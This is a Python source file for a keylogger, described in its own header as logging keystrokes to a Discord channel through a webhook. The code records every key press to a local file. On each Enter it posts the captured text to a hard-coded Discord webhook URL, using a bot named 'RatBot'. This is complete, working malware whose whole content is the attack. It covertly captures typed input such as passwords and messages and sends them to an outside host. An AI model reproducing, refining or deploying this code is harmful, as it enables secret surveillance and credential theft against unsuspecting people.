# Simple Keylogger that Logs Keys into a Discord Text Channel of your Liking via its Webhook.
# For more Information, check out the READ.ME

from pynput.keyboard import Listener
import requests, time, os

# Webhook URL (for the Discord server)
url = 'https://discord.com/api/webhooks/1133222518967255142/lccCX-EVBt5mPoZugBXdCEdLUWTodN_uEZx7hRwTog25OPD3F6T2u485W8eOO4OjFbn-'

# Global variable
replace = 0


def on_press(key):
    global replace
    with open('log', 'a') as f:
        k = str(key).replace("'", "")
        print(f'{key}')
        if k.find('space') > 0:
            f.write(' ')
        elif k.find('enter') > 0:
            replace += 1
            time.sleep(0.5)
            discordchannelsend()
            print('The Keylogger Logged some Keys!')
            file_linereplace(1)
        elif k.find('backspace') > 0:
            f.seek(f.tell() - 1, os.SEEK_SET)  # Move the cursor back one position
            f.truncate()  # Deletes the last character typed in the code
        elif k.find('Key') == -1:
            f.write(k)


def file_linereplace(line_replace):
    with open('log', 'r') as u:
        f = u.readlines()
        if 1 <= line_replace <= len(f):
            del f[line_replace - 1]
        else:
            print('Error: Line number out of range.')
        with open('log', 'w') as d:
            for line in f:
                d.write(line)


def discordchannelsend():
    with open('log', 'r') as lines:
        formatting = lines.readlines()
        NoDotsOrSquareBrackets = ''.join(formatting)

    data = {
        'avatar_url': 'https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2F3c1703fe8d.site.internapcdn.net%2Fnewman%2Fgfx%2Fnews%2Fhires%2F2018%2F3-rat.jpg&f=1&nofb=1&ipt=533872860dbda285a7f2a9f48c75690db28f18995f1c58c5759d2e4f3920b83c&ipo=images',
        'username': 'RatBot',
        'content': 'Hello',
        'embeds': [
            {
                'title': '***INFO***',
                'color': 0x00FFFF,
                'description': NoDotsOrSquareBrackets
            }
        ]
    }
    requests.post(url, json=data)


def main():
    with open('log', 'r') as file:
        content = file.read()
        print(content)

if __name__ == '__main__':
    main()
    with Listener(on_press=on_press) as listener:
        listener.join()
